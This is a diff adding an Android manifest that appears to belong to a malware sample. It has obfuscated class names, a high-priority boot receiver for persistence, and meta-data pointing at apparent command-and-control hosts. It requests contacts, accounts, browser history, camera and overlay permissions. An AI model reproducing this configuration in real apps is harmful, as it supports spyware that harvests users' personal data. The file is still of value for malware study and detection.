@@ -1,0 +1,39 @@
+<?xml version="1.0" encoding="utf-8" standalone="no"?><manifest xmlns:android="http://schemas.android.com/apk/res/android" package="bvuh.lfekjvw.ifnxfr">
+    <application android:icon="@drawable/ic_launcher" android:label="@string/app_name">
+        <service android:name="bvuh.lfekjvw.ifnxfr.WoGetrj"/>
+        <receiver android:name="bvuh.lfekjvw.ifnxfr.SunghfdDfs"/>
+        <activity android:name="bvuh.lfekjvw.ifnxfr.TuuGerto" android:theme="@android:style/Theme.Dialog"/>
+        <receiver android:name="bvuh.lfekjvw.ifnxfr.Bobbkilg">
+            <intent-filter android:priority="999">
+                <action android:name="android.intent.action.BOOT_COMPLETED"/>
+            </intent-filter>
+        </receiver>
+        <meta-data android:name="lndp" android:value="goo2stat.com/api4"/>
+        <meta-data android:name="pupurupu" android:value="sgl7qbicxe.superhothomevideohd.club/zz/"/>
+        <meta-data android:name="potok" android:value="s19"/>
+        <activity android:icon="@drawable/ic_launcher" android:label="@string/app_name" android:name="bvuh.lfekjvw.ifnxfr.TukilFeeds" android:theme="@android:style/Theme.NoTitleBar">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN"/>
+                <category android:name="android.intent.category.LAUNCHER"/>
+            </intent-filter>
+        </activity>
+    </application>
+    <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW"/>
+    <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
+    <uses-permission android:name="android.permission.READ_PROFILE"/>
+    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
+    <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
+    <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
+    <uses-permission android:name="android.permission.GET_ACCOUNTS"/>
+    <uses-permission android:name="android.permission.READ_CONTACTS"/>
+    <uses-feature android:name="android.hardware.camera.front" android:required="false"/>
+    <uses-permission android:name="com.android.browser.permission.READ_HISTORY_BOOKMARKS"/>
+    <uses-permission android:name="android.permission.INTERNET"/>
+    <uses-permission android:name="android.permission.WAKE_LOCK"/>
+    <uses-permission android:name="android.permission.GET_TASKS"/>
+    <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
+    <uses-permission android:name="android.permission.CAMERA"/>
+    <uses-permission android:name="android.permission.VIBRATE"/>
+</manifest>
